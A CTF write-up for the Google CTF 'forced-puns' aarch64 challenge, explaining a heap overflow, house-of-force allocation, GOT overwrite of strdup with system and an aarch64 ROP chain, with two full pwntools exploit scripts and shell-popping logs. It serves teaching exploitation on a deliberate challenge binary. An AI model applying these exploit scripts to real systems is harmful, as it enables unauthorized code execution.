---
layout: post
title: "GoogleCTF - forced-puns"
date: 2016-05-02 01:00
categories: ctf exploit
---

Here is a write-up for the `forced-puns` challenge of the first Google CTF that was held that past weekend. The binary suffers from a buffer overflow vulnerability on the heap that allows the overwrite of the top chunk to perform the *house of force* heap exploitation technique. The binary also leaks a heap address that leads to a leak of an address in the `.text` segment and finally a libc address. With all that information, it is possible to overwrite a pointer in the `.got` table with the address of [`system`][system] to execute a shell. It was fun to tackle an ARM binary for the first time!

# Basic information

From the organizers:

```
Forced Puns
125 points

Running on ssl-added-and-removed-here.ctfcompetition.com:11111

Can you exploit the following binary? Don't forget to account for SSL
off-loading.

    forced-puns.tar.gz
```

The binary is an ELF 64-bit that was compiled for 64-bit ARM processor (`aarch64`), with the PIE protection:

```bash
$ file app/forced-puns
app/forced-puns: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux
3.7.0, BuildID[sha1]=a677e5ead33f8ac9d3948e8157cdcfa39b3f9701, not stripped

$ checksec --file app/forced-puns
RELRO           STACK CANARY      NX            PIE             RPATH
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH
RUNPATH      FILE
No RUNPATH   app/forced-puns
```

The archive contains the binary plus the libc and the dynamic linker libraries to run the binary inside [qemu][qemu]. I chose to run the binary in a VM because qemu didn't respond to interrupts sent through GDB to pause the program. Here is the command to run it inside qemu and open a port to debug it with GDB (note the absolute path for the libs):

```bash
$ qemu-aarch64 -g 1234 -L /home/user/ctf/google/forced_puns/ app/forced-puns
```

To run it inside a VM:

```bash
# with GDB
$ socat tcp-l:11111,reuseaddr,fork  exec:"gdbserver ':1234' app/forced-puns"
# with strace
$ socat tcp-l:11111,reuseaddr,fork  exec:"strace app/forced-puns"
```

# Operation

The name of the binary comes from the fact that it prints puns after each command we give it. Here is an example of a simple run of the program where we can see that it gives us the size of the `struct entry` and leaks an address on a heap address.

```bash
$ app/forced-puns 
                                                            
_|_|_|_|    _|_|    _|_|_|      _|_|_|  _|_|_|_|  _|_|_|    
_|        _|    _|  _|    _|  _|        _|        _|    _|  
_|_|_|    _|    _|  _|_|_|    _|        _|_|_|    _|    _|  
_|        _|    _|  _|    _|  _|        _|        _|    _|  
_|          _|_|    _|    _|    _|_|_|  _|_|_|_|  _|_|_|    
                                                                                                     
        _|_|_|    _|    _|  _|      _|    _|_|_|  
        _|    _|  _|    _|  _|_|    _|  _|        
        _|_|_|    _|    _|  _|  _|  _|    _|_|    
        _|        _|    _|  _|    _|_|        _|  
        _|          _|_|    _|      _|  _|_|_|    
                                          
                                          

Q. When does a joke become a Dad joke?
A. When it becomes apparent.

1. Add an entry
2. Print entries
3. Quit

--> 1
malloc_usable_size is 264, and sizeof(struct entry) is 256

My duck got arrested.
.. Apparently he's a quackhead.
.. I tried to bail him out, they wouldn't let me. Said he was a flight risk.

1. Set name
2. Set small
3. Set large
4. cd ..

--> 1

Person A: I once met a dog with no nose.
Person B: How does he smell?
Person A: Terrible.

What name would you like for this entry?
--> NAME

My duck got arrested.
.. Apparently he's a quackhead.
.. I tried to bail him out, they wouldn't let me. Said he was a flight risk.

1. Set name
2. Set small
3. Set large
4. cd ..

--> 2

My fridge is full of German sausages... I made the wurst mistake when I went shopping last time.

What value do you want to set for the small value?
--> SMALL

My duck got arrested.
.. Apparently he's a quackhead.
.. I tried to bail him out, they wouldn't let me. Said he was a flight risk.

1. Set name
2. Set small
3. Set large
4. cd ..

--> 3

Why did Fred fall off a bike?
Because Fred was a fish.

What size should large be?
--> 16

My duck got arrested.
.. Apparently he's a quackhead.
.. I tried to bail him out, they wouldn't let me. Said he was a flight risk.

1. Set name
2. Set small
3. Set large
4. cd ..

--> 4

Q. When does a joke become a Dad joke?
A. When it becomes apparent.

1. Add an entry
2. Print entries
3. Quit

--> 2
Name: NAME
Small: SMALL
Large: 0x55c49c9970

Q. When does a joke become a Dad joke?
A. When it becomes apparent.

1. Add an entry
2. Print entries
3. Quit

--> 
```

The entries we create are part of a linked list with its first pointer stored in a variable called `root` located in the `.bss` segment. We can also see that there is no possibility to free anything on the heap, therefore we won't be able to corrupt the free lists.

Here is a representation of the structure:

```c
struct entry {
  char *large;
  char *small;
  struct entry *next;
  char name[232];
}
```

In memory:

```
+----------------+
| prev_size      | <= chunk header
| size           |
+----------------+
| large          | <= entry->large
+----------------+
| small          | <= entry->small
+----------------+
| next           | <= entry->next
+----------------+
| name           | <= entry->name
. ...            .
+----------------+
```

`prev_size` is set when a chunk is [`free`][malloc]'d which never happens in that program.

## main

The main function is in charge of preparing everything needed by the program:

* It looks for the `DEBUG` environment variable. If it is set, the function `debug_end_of_entry` is used instead of `end_of_entry`. Their role is to look for the last entry in the linked list. The debug version prints the address of each entry it finds. The address of that function is stored in the first chunk of the heap and the address of that chunk is stored in the `fp` variable which is in the `.bss` segment.

* It allocates a 2048 bytes buffer to stores what is read by [`read`][read]. The address is stored in the `line` variable which is in the `.bss` segment

* It prints the banner and the menu.

* It uses the function `read` to read 2048 bytes and to store the data into the buffer pointed by `line`. It then parses the data to find a new-line character `\n` or `0xa` and replaces it with `\0`. If none is found, it just complains and loops back.

* Once a line is read, it passes the control to the `parse_line` function

## parse_line

That function handles both the main menu and the menu to add an entry. Here are the operations done in the main menu:

* `Add an entry`:
  * uses a custom loop to find the last entry
  * allocates a chunk
  * stores the address in the previous entry in `entry->next`
  * print the "add an entry" menu

* `Print entries`:
  * goes through each entry (again custom loop)
  * print its content. It can be seen as the following calls to `printf`:
    * `printf("Name: %s\n", entry->name);`
    * `printf("Small: %s\n", entry->small);`
    * `printf("Large; %p\n", entry->large);`

* `Quit`:
  * calls [`exit`][exit]

And in the menu to add an entry:

* `Set name`:
  * uses `end_of_entry` or `debug_end_of_entry` to locate the newly added entry
  * uses [`strcpy`][strcpy] to copy the data in `entry->name`. Here we should read buffer overflow!

* `Set small`:
  * uses `end_of_entry` or `debug_end_of_entry` to locate the newly added entry
  * uses [`strdup`][strdup] to allocate a buffer for the string and place the resulting pointer in `entry->small`

* `Set large`:
  * uses [`strtoll`][strtol] to translate the input into a `long long`
  * allocates the buffer using the previous value and stores the resulting pointer in `entry->large`

* `cd ..`:
  * goes back in the main menu

# Vulnerability

The buffer overflow can be used to write after the current chunk. This can be used in two ways:

* control the pointer in `entry->small`: the "small technique"
* control the size top most or wilderness chunk of the heap: "house of force"

## Use small to leak data aka the small technique

The excess of data can be used to pre-place data in a future entry. With a big enough name, we could set a pointer at the place of `small` to dereference it when the entry is printed:

1. add an entry
2. set the name
3. provide 256 bytes of padding followed by the pointer we want to dereference: for example `A`s followed by a pointer in the `.text` segment
4. add an entry: to create an empty entry that will be printed
5. print the entries

Here is the layout on the heap right after step number 3:

```
+----------------+
| prev_size      |
| size           |
+----------------+
| large          | <= current entry
+----------------+
| small          |
+----------------+
| next           |
+----------------+
| AAAAAAAAAAAAAA |
. ...            .
+----------------+
+----------------+
| AAAAAAAAAAAAAA | <= future chunk header
| AAAAAAAAAAAAAA |
+----------------+
| AAAAAAAAAAAAAA | <= future entry->large
+----------------+
| malicious ptr  | <= future entry->small
+----------------+
| next           |
+----------------+
| name           |
. ...            .
+----------------+
```

After step number 4 we can see that the malicious pointer is preserved:

```
+----------------+
| prev_size      |
| size           |
+----------------+
| large          |
+----------------+
| small          |
+----------------+
| next           |
+----------------+
| AAAAAAAAAAAAAA |
. ...            .
+----------------+
+----------------+
| AAAAAAAAAAAAAA |
| size           |
+----------------+
| AAAAAAAAAAAAAA | <= newly added entry
+----------------+
| malicious ptr  | 
+----------------+
| next           |
+----------------+
| name           |
. ...            .
+----------------+
```

## House of force

The buffer overflow can also be used to overwrite the top most chunk in the heap. That chunk is used by [`malloc`][malloc] to know how much space is left in the current heap. Each time a new chunk is allocate, space is taken from that special chunk and its size is reduced. When a certain threshold -- [MINSIZE][minsize] -- is reached, `malloc` calls [`mmap`][mmap] to increase the size of the current heap or to create a new heap if the current one can't be increased. As any chunk, the top chunk has a header with its current size.

```
+----------------+
| prev_size      |
| size           |
+----------------+
| large          |
+----------------+
| small          |
+----------------+
| next           |
+----------------+
| name           |
. ...            .
+----------------+
+----------------+
|                | <= no prev_size
| size           | <= size remaining
+----------------+
. ...            .
+----------------+ <= end of the heap
```
If we overwrite that size we can control the behavior of malloc. For example we can place `-1`, `malloc` will see that the size equals `0xffffffffffffffff`, because a size is of type `size_t` which is unsigned. Now `malloc` thinks that the size of the top chunk is huge and will not call `mmap` even if we try to allocate a really big chunk. We can now trick malloc into allocating chunk anywhere by allocating a huge chunk of a size equals to:

```
malicious_size = targeted_address - top_chunk_address - 2 * sizeof(chunk_header)
```

Once allocated, the next chunk we allocate will lend at the targeted address. This gives us the following operations:

1. add an entry
2. set a name that will overwrite the size of the top chunk with `-1`
3. set large with malicious size
4. add another entry

More information can be found in the [phrack magazine issue 66][phrak] and a guided example can be found in [shellphish's github][shellphish]

# Exploitation

I've created two payloads to exploit the binary because the first one was working on my VM but not on the remote target and I thought that my ROP chain was not working. Strangely the second one had the same behavior as the first. They failed because of something else.

SSL must be used to communicate with the remote target but I wasn't using SSL with my VM. After I leaked everything I needed to launch my payload pop a shell, the SSL connection systematically broke. To create the SSL connection, I used the built-in SSL tube of [pwntools][pwntools]. To investigate the problem, I used [`socat`][socat] as an SSL proxy and stopped using the SSL feature of pwntools:

```
$ socat tcp-l:11111,fork openssl:ssl-added-and-removed-here.ctfcompetition.com:11111
```

The idea was to debug the communication with packet capture. In fact no debug was needed because my second payload was working... well... both payloads were working `-_-'`
The downside is that I lost a _lot_ of time creating two payloads but I learned how to ROP on ARM!

The base of both payloads is the same:

1. leak a heap address
   * add an entry
   * set large
   * print entries to leak the address in `large`

2. leak a text address
   * use house of force the place a chunk at the beginning the heap to place the address of `end_of_entry` where `large` should be in the `struct entry`
     *or use the small technique*
   * print entries

3. leak a libc address on the `.got`
   * house of force or small technique

## Overly complicated payload

In the first payload I wanted to use the [magic gadget][magicgadget] to easily pop a shell. In the `.got`, an address of a libc function could be replaced by the address of the magic gadget. The problem is that just before calling [`execve`][execve], it dereferences both registers `x21` and `x24`:

```
.text:000000000003FE40  ADRP  X0, #environ_ptr_0@PAGE
.text:000000000003FE44  LDR   X0, [X0,#environ_ptr_0@PAGEOFF]
.text:000000000003FE48  MOV   X1, X20
.text:000000000003FE4C  LDR   X2, [X0]
.text:000000000003FE50  ADRP  X0, #aBinSh@PAGE ; "/bin/sh"
.text:000000000003FE54  ADD   X0, X0, #aBinSh@PAGEOFF ; "/bin/sh"
.text:000000000003FE58  STR   W19, [X21,#dword_1492D8@PAGEOFF]
.text:000000000003FE5C  STR   W19, [X24,#(dword_1492DC - 0x1492D8)]
.text:000000000003FE60  BL    execve
```

When `malloc` is called to add an entry, `x21` is set, leaving us with `x24` having zero. I had to find a way to set a correct value into that register.

In aarch64, when `ret` is executed without a register, it returns at the address stored in `x30` and restore the stack pointer with the address in `x29`.

Here are the next steps to continue the payload:

4. leak a stack address
   * leak the content of `environ` with the `small` technique

5. overwrite `line` to point on the stack
   * house of force to overwrite `line` in the `.bss`
   * `line` should point somewhere below the stack pointer otherwise the program will constantly overwrite the content of the buffer with stuff such as saved stack pointer, saved program counter and variable of stack frames of other functions

6. overwrite `malloc` in the `.got` with the address of the first gadget
   * house of force
   * the first gadget places the stack pointer on the buffer pointed by `line`:
     `0x00000000000c5818 : add sp, sp, #0x100 ; ret`
     It returns back in `parse_line`, which restore the saved program counter and stack pointer in `x30` and `x29` respectively. Because the current stack pointer is in the buffer that we control, we can provide address of our choosing such as the second gadget.

7. send the rest of the payload:
   * send `1` to call `malloc` that will in fact call the first gadget
   * a stack address for `x29` and for `x30` the address of the second gadget:
     `0x0000000000023ba8 : ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret`
     The goal of that gadget is to put a valid address in `x24` and the address of the magic gadget in `x30`
   * padding because of the offset 0x30 and 0x40 in the second gadget
   * an address for `x24`
   * an address for `x29`
   * the address of the magic gadget
   * padding
   * the address of `/bin/sh` (will be used in `argc` for the `execve` of the magic gadget)
   * NULL to end the argument list

And this pops a nice shell!

## Way simpler payload

`strdup` is called to copy the string for `small`, therefore its first argument is a string that we control. We could replace in the `.got`, its pointers with `system` and execute our shell that way... no need to leak a stack address, overwrite `line` and craft a ROP chain. Here is the next step needed to continue the payload:

4. overwrite `strdup` in the `.got` with `system`:
   * house of force
   * set a name with some padding to reach `strdup` address and the address of `system`
   * set small with `/bin/sh`, `sh`, `bash`, `cat /flag` or whatever you want...

There is one constraint: the `next` pointer of the chunk that we allocate over the `.got` must be on a NULL so that `end_of_entry` stops. There is a nice spot right before the `.got` where this is true.

## script

```python
#!/usr/bin/env python2

from pwn import *
from time import sleep

#PRINT=True
PRINT=False
PROMPT='--> '

# with: socat tcp-l:11111,fork openssl:ssl-added-and-removed-here.ctfcompetition.com:11111
r = remote('localhost', 11111)
#r = remote('192.168.122.3', 11111)
#r = remote('ssl-added-and-removed-here.ctfcompetition.com', 11111, ssl=True)

def recvuntil(rec='', p=PRINT):
    global r
    data = r.recvuntil(rec)
    if p:
        print(data)
    return data

def sendline(msg='', p=PRINT):
    global r
    r.sendline(msg)

def sr(rec=PROMPT, msg='', p=PRINT):
    recvuntil(rec, p)
    sendline(msg, p)
    if p:
        print(msg)

def add_entry(name=None, small=None, large=None, back=True, p=PRINT):
    sr(msg='1', p=p)
    if name:
        sr(msg='1', p=p)
        sr(msg=name, p=p)
    if small:
        sr(msg='2', p=p)
        sr(msg=small, p=p)
    if large:
        sr(msg='3', p=p)
        sr(msg=large, p=p)
    if back:
        sr(msg='4', p=p)

def print_entries(number=0, p=PRINT):
    sr(msg='2')
    for i in range(0, number):
        recvuntil('Name: ')
        name = recvuntil('\n')
        recvuntil('Small: ')
        small = recvuntil('\n')
        recvuntil('Large: ')
        large = recvuntil('\n')
    return (name, small, large)

if __name__ == '__main__':
    text_end_of_entry_offset = 0xf54
    libc_system_offset = 0x3ffd0
    libc_stderr_offset = 0x1485c8
    text_stderr_offset = 0x12210

    add_entry(large='8')
    _, _, heap_addr = print_entries(1)
    heap_addr = int(heap_addr, 16)
    heap_offset = heap_addr & 0xfff
    heap_base = heap_addr - heap_offset

    log.info('Leaked heap_addr: 0x{:x}'.format(heap_addr))
    log.info('Leaked heap_base: 0x{:x}'.format(heap_base))

    # house of force to leak a .text addr at the beginning of the heap
    name = p64(0xffffffffffffffff) * 31
    # here use a relative offset as we stay on the heap
    # 0x20 and 0x100 are also removed because of the two headers and the size
    # of the next chunk that will be created
    malicious_size =  -heap_offset - 0x20 - 0x110
    add_entry(name=name, large=str(malicious_size))
    # create a chunk to get out of here and land on zeros
    add_entry(small='B'*0x100)
    _, _, text_addr = print_entries(3)
    text_addr = int(text_addr, 16)
    text_base = text_addr - text_end_of_entry_offset
    log.info('Leaked .text_addr: 0x{:x}'.format(text_addr))
    log.info('Leaked .text_base: 0x{:x}'.format(text_base))

    # leak stderr address in the .got
    add_entry(name='A' * 0x100 + p64(text_base + text_stderr_offset))
    add_entry()
    _, libc_addr, _ = print_entries(5)
    libc_addr = libc_addr.strip('\n')
    libc_addr = u64(libc_addr + '\0' * (8 - len(libc_addr)))
    libc_base = libc_addr - libc_stderr_offset
    log.info('Leaked libc_addr: 0x{:x}'.format(libc_addr))
    log.info('Leaked libc_base: 0x{:x}'.format(libc_base))

    # house of force to overwrite strdup with system
    malicious_size =  text_base + 0x12220
    malicious_size -= heap_addr - 0x400
    add_entry(name=name, large=str(malicious_size))
    # overwrite everything until system
    add_entry(name='D' * 8 * 6 + p64(libc_base + libc_system_offset),
            small='/bin/sh', back=False)

    r.interactive()
```

## Execution

```bash
$ ./payload.py
[+] Opening connection to localhost on port 11111: Done
[*] Leaked heap_addr: 0x5574896950
[*] Leaked heap_base: 0x5574896000
[*] Leaked .text_addr: 0x556c1d9f54
[*] Leaked .text_base: 0x556c1d9000
[*] Leaked libc_addr: 0x7f9ba5d5c8
[*] Leaked libc_base: 0x7f9b915000
[*] Switching to interactive mode
$ ls -la
total 32
drwxr-xr-x    7 0        0             4096 Apr 25 21:27 .
drwxr-xr-x    7 0        0             4096 Apr 25 21:27 ..
drwxr-xr-x    2 0        0             4096 Apr 25 20:50 app
drwxr-xr-x    2 0        0             4096 Apr 25 21:28 bin
-rw-r--r--    1 0        0               60 Apr 25 18:29 flag
drwxr-xr-x    3 0        0             4096 Apr 25 18:23 lib
drwxr-xr-x    2 0        0             4096 Apr 25 18:23 lib64
drwxr-xr-x    2 0        0             4096 Apr 25 18:23 sbin
$ cat flag
CTF{somebody.has.written.gullible.on.the.ceiling.above.you}
```

# Bonus

Let's publish the overly complicated payload for future reference on how to ROP in aarch64. The helper functions are not shown because they are the same as with the previous payload:

```python
if __name__ == '__main__':
    add_entry(large='8')
    _, _, heap_addr = print_entries(1)
    heap_addr = int(heap_addr, 16)
    offset = heap_addr & 0xfff
    malicious_size =  -offset - 0x20 - 0x110

    log.info('Leaked heap_addr: 0x{:x}'.format(heap_addr))
    log.info('Malicious size: {}'.format(malicious_size))

    name = p64(0xffffffffffffffff) * 31
    add_entry(name=name, large=str(malicious_size))
    add_entry(small='B'*0x100)
    _, _, text_addr = print_entries(3)
    text_addr = int(text_addr, 16)
    log.info('Leaked .text_addr: 0x{:x}'.format(text_addr))
    add_entry(name='A' * 0x100 + p64(text_addr + (0x12200 - 0xf54) + 0x10))
    add_entry()
    _, libc_addr, _ = print_entries(5)
    libc_addr = libc_addr.strip('\n') # offset base: 0x1485c8
    libc_addr = u64(libc_addr + '\0' * (8 - len(libc_addr)))
    libc_base = libc_addr - 0x1485c8
    log.info('Leaked libc_addr: 0x{:x}'.format(libc_addr))
    log.info('Leaked libc_base: 0x{:x}'.format(libc_base))

    environ = libc_addr + 0x1700
    add_entry(name='A' * 0x100 + p64(environ))
    add_entry()
    _, stack_addr, _ = print_entries(7)
    stack_addr = stack_addr.strip('\n')
    stack_addr = u64(stack_addr + '\0' * (8 - len(stack_addr)))
    log.info('Leaked stack_addr: 0x{:x}'.format(stack_addr))

    #house of force to overwrite line ptr
    malicious_size =  text_addr + (0x12620 - 0xf54)
    malicious_size -= (heap_addr - 0x1d0)
    add_entry(name=name, large=str(malicious_size))
    offset = 0x180 - 0xb0
    add_entry(name=p64(stack_addr - offset)[:-1])

    #house of force to overwrite exit with ret
    gadget1_offset = 0x00000000000c5818 #: add sp, sp, #0x100 ; ret
    gadget2_offset = 0x0000000000023ba8 #: ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
    magic_gadget = libc_base + 0x3fe40
    malicious_size =  0x12220
    malicious_size -= (0x12620 + 0x110 + 0x110)
    add_entry(name=name, large=str(malicious_size))
    add_entry(name='D' * 8 * 8 + p64(libc_base + gadget1_offset))
    payload = p64(0x31) # trigger malloc
    payload += p64(stack_addr)
    payload += p64(libc_base + gadget2_offset)
    payload += p64(stack_addr-8) * 6
    payload += p64(0)
    payload += p64(magic_gadget)
    payload += p64(stack_addr-16) * 6
    payload += p64(libc_base + 0x11b3c0) * 9
    payload += p64(0) * 2

    sendline(payload)

    r.interactive()
```

And its execution:

```
$ ./payload_rop.py 
[+] Opening connection to localhost on port 11111: Done
[*] Leaked heap_addr: 0x558f636950
[*] Malicious size: -2688
[*] Leaked .text_addr: 0x557ae38f54
[*] Leaked libc_addr: 0x7f8a3245c8
[*] Leaked libc_base: 0x7f8a1dc000
[*] Leaked stack_addr: 0x7ffdf04c58
[*] Switching to interactive mode

Q. When does a joke become a Dad joke?
A. When it becomes apparent.

1. Add an entry
2. Print entries
3. Quit

--> $ ls
app
bin
flag
lib
lib64
sbin
$ cat flag
CTF{somebody.has.written.gullible.on.the.ceiling.above.you}
```

Why go the easy way? `(┛◉Д◉)┛┻━┻`

[system]: http://man7.org/linux/man-pages/man3/system.3.html
[malloc]: http://man7.org/linux/man-pages/man3/malloc.3.html
[mmap]: http://man7.org/linux/man-pages/man2/mmap.2.html
[read]: http://man7.org/linux/man-pages/man2/read.2.html
[exit]: http://man7.org/linux/man-pages/man3/exit.3.html
[strcpy]: http://man7.org/linux/man-pages/man3/strncpy.3.html
[strdup]: http://man7.org/linux/man-pages/man3/strdup.3.html
[strtol]: http://man7.org/linux/man-pages/man3/strtol.3.html
[qemu]: http://wiki.qemu.org/Main_Page
[phrak]: http://phrack.org/issues/66/10.html
[shellphish]: https://github.com/shellphish/how2heap/blob/master/house_of_force.c
[pwntools]: https://github.com/Gallopsled/pwntools
[minsize]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=malloc/malloc.c;hb=HEAD
[socat]: http://www.dest-unreach.org/socat/
[magicgadget]: {% post_url 2016-03-30-Radare2-of-the-Lost-Magic-Gadget %}
[execve]: http://man7.org/linux/man-pages/man2/execve.2.html
